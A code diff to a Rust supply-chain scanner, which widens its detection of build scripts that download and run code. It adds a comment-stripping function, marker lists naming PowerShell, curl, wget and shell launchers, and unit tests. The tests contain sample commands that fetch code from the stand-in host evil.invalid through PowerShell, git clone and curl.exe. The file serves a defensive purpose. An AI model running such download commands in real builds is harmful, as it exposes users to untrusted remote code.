@@ -193,16 +193,14 @@ pub(super) fn inspect_build_script(
     blockers: &mut Vec<StaticIndicator>,
     warnings: &mut Vec<StaticIndicator>,
 ) {
-    let lower = raw.to_ascii_lowercase();
-    let network_markers = [
+    let lower = strip_rust_comments(raw).to_ascii_lowercase();
+    let network_api_markers = [
         "reqwest::blocking",
         "reqwest::client",
         "ureq::get",
         "ureq::post",
         "tcpstream::connect",
         "udpsocket::connect",
-        "command::new(\"curl\")",
-        "command::new(\"wget\")",
     ];
     let execution_markers = [
         "command::new",
@@ -212,19 +210,44 @@ pub(super) fn inspect_build_script(
         "chmod",
         "create_no_window",
     ];
-    let network = matching_markers(&lower, &network_markers);
+    let dangerous_command_markers = [
+        "powershell",
+        "pwsh",
+        "cmd.exe",
+        "wscript",
+        "cscript",
+        "invoke-webrequest",
+        "start-bitstransfer",
+        "curl.exe",
+        "command::new(\"curl\")",
+        "command::new(\"wget\")",
+        "command::new(\"python\")",
+        "command::new(\"python3\")",
+        "command::new(\"sh\")",
+        "command::new(\"bash\")",
+    ];
+    let network = matching_markers(&lower, &network_api_markers);
     let execution = matching_markers(&lower, &execution_markers);
+    let urls = matching_markers(&lower, &["https://", "http://"]);
+    let dangerous_commands = matching_markers(&lower, &dangerous_command_markers);
+    let git_download = lower.contains("command::new(\"git\")")
+        && (lower.contains("arg(\"clone\")") || lower.contains("arg(\"fetch\")"));
+    let downloads_and_executes = !network.is_empty() && !execution.is_empty()
+        || !urls.is_empty() && (!dangerous_commands.is_empty() || git_download);
 
-    if !network.is_empty() && !execution.is_empty() {
+    if downloads_and_executes {
         blockers.push(indicator(
             "SC-BUILD-NETWORK-EXECUTION",
             "blocker",
             path,
             "构建脚本同时具备网络访问和进程执行能力",
             format!(
-                "network=[{}], execution=[{}]",
+                "network=[{}], urls=[{}], execution=[{}], dangerous_commands=[{}], git_download={}",
                 network.join(","),
-                execution.join(",")
+                urls.join(","),
+                execution.join(","),
+                dangerous_commands.join(","),
+                git_download
             ),
         ));
     } else if !network.is_empty() {
@@ -255,7 +278,12 @@ pub(super) fn inspect_build_script(
             "detached",
         ],
     );
-    if !evasion_markers.is_empty() && (!network.is_empty() || !execution.is_empty()) {
+    if !evasion_markers.is_empty()
+        && (!network.is_empty()
+            || !urls.is_empty()
+            || !execution.is_empty()
+            || !dangerous_commands.is_empty())
+    {
         blockers.push(indicator(
             "SC-BUILD-EVASION",
             "blocker",
@@ -264,6 +292,100 @@ pub(super) fn inspect_build_script(
             evasion_markers.join(","),
         ));
     }
+}
+
+/// 去掉 Rust 行注释和块注释，但保留字符串内容，以区分文档 URL 与真实命令参数。
+fn strip_rust_comments(raw: &str) -> String {
+    #[derive(Clone, Copy)]
+    enum State {
+        Code,
+        String,
+        Character,
+        LineComment,
+        BlockComment(usize),
+    }
+
+    let chars = raw.chars().collect::<Vec<_>>();
+    let mut output = String::with_capacity(raw.len());
+    let mut state = State::Code;
+    let mut escaped = false;
+    let mut index = 0;
+    while index < chars.len() {
+        let current = chars[index];
+        let next = chars.get(index + 1).copied();
+        match state {
+            State::Code if current == '/' && next == Some('/') => {
+                state = State::LineComment;
+                output.push(' ');
+                index += 2;
+            }
+            State::Code if current == '/' && next == Some('*') => {
+                state = State::BlockComment(1);
+                output.push(' ');
+                index += 2;
+            }
+            State::Code => {
+                output.push(current);
+                if current == '"' {
+                    state = State::String;
+                    escaped = false;
+                } else if current == '\'' {
+                    state = State::Character;
+                    escaped = false;
+                }
+                index += 1;
+            }
+            State::String => {
+                output.push(current);
+                if current == '"' && !escaped {
+                    state = State::Code;
+                }
+                escaped = current == '\\' && !escaped;
+                if current != '\\' {
+                    escaped = false;
+                }
+                index += 1;
+            }
+            State::Character => {
+                output.push(current);
+                if current == '\'' && !escaped {
+                    state = State::Code;
+                }
+                escaped = current == '\\' && !escaped;
+                if current != '\\' {
+                    escaped = false;
+                }
+                index += 1;
+            }
+            State::LineComment => {
+                if current == '\n' {
+                    output.push('\n');
+                    state = State::Code;
+                }
+                index += 1;
+            }
+            State::BlockComment(depth) if current == '/' && next == Some('*') => {
+                state = State::BlockComment(depth + 1);
+                index += 2;
+            }
+            State::BlockComment(depth) if current == '*' && next == Some('/') => {
+                state = if depth == 1 {
+                    State::Code
+                } else {
+                    State::BlockComment(depth - 1)
+                };
+                index += 2;
+            }
+            State::BlockComment(depth) => {
+                if current == '\n' {
+                    output.push('\n');
+                }
+                state = State::BlockComment(depth);
+                index += 1;
+            }
+        }
+    }
+    output
 }
 
 fn matching_markers(raw: &str, markers: &[&str]) -> Vec<String> {
@@ -353,4 +475,51 @@ fn hex_digest(bytes: &[u8]) -> String {
         .iter()
         .map(|byte| format!("{byte:02x}"))
         .collect()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn documentation_url_plus_compiler_probe_is_not_network_execution() {
+        let script = r#"
+// Documentation: https://example.invalid/build
+fn main() {
+    std::process::Command::new("rustc").arg("--version").status().unwrap();
+}
+"#;
+        let mut blockers = Vec::new();
+        let mut warnings = Vec::new();
+        inspect_build_script("build.rs", script, &mut blockers, &mut warnings);
+        assert!(blockers.is_empty());
+    }
+
+    #[test]
+    fn powershell_url_and_git_clone_variants_are_blocked() {
+        for script in [
+            r#"Command::new("powershell").args(["-c", "Invoke-WebRequest https://evil.invalid/x"]);"#,
+            r#"Command::new("git").arg("clone").arg("https://evil.invalid/repo");"#,
+            r#"Command::new("curl.exe").arg("https://evil.invalid/x").spawn();"#,
+        ] {
+            let mut blockers = Vec::new();
+            let mut warnings = Vec::new();
+            inspect_build_script("build.rs", script, &mut blockers, &mut warnings);
+            assert!(
+                blockers
+                    .iter()
+                    .any(|item| item.rule_id == "SC-BUILD-NETWORK-EXECUTION"),
+                "missing blocker for {script}"
+            );
+        }
+    }
+
+    #[test]
+    fn nested_block_comments_are_removed_but_string_urls_remain() {
+        let stripped = strip_rust_comments(
+            "/* outer https://comment /* nested */ end */ let x = \"https://string\";",
+        );
+        assert!(!stripped.contains("comment"));
+        assert!(stripped.contains("https://string"));
+    }
 }
